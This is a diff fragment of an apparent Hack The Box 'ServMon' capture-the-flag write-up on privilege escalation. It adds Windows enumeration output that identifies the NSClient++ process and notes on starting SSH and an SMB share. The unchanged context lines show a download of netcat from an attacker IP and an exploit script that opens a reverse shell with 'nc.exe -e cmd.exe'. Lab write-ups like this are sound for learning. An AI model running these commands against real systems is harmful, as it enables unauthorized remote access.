@@ -119,5 +119,27 @@ nadine@SERVMON C:\Users\Nadine\Desktop>powershell -c "curl http://10.10.14.11/nc
 
 └─# python exploit.py -t 10.10.10.184 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c "nc.exe -e cmd.exe <Attacker_IP> <PORT>"
 
+nadine@SERVMON C:\Users\Nadine\Downloads>netstat -ano
+
+Active Connections       
+  Proto  Local Address          Foreign Address        State           PID 
+  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2640
+ nadine@SERVMON C:\Users\Nadine\Downloads>tasklist /fi "pid eq 2640"
+ERROR: Access denied
+nadine@SERVMON C:\Users\Nadine\Downloads>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Nadine\Downloads> Get-Process -id 2640
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    305      23     5448      17896              2640   0 nscp
+ 
 I need to port forward here.
+└─# service ssh start
+Open an smb local server just in case 
+└─# python smbserver.py share `pwd` -smb2support
+
 Reference: https://blog.luckolen.xyz/posts/HTB/ServMon#privilege-escalation
